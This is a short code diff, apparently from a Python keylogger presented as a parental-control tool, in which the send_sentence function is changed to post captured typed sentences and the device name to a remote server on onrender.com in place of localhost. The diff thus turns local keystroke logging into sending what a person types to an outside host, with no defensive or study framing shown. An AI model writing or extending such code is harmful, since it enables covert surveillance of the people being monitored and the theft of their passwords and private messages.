@@ -52,7 +52,7 @@ def send_sentence(sentence):
     global device_name
     try:
         print(device_name)
-        requests.post("http://localhost:5000/keylogger/event", json={
+        requests.post("https://parentcontrolserver.onrender.com/keylogger/event", json={
             "word": sentence,
             "device": device_name
         })
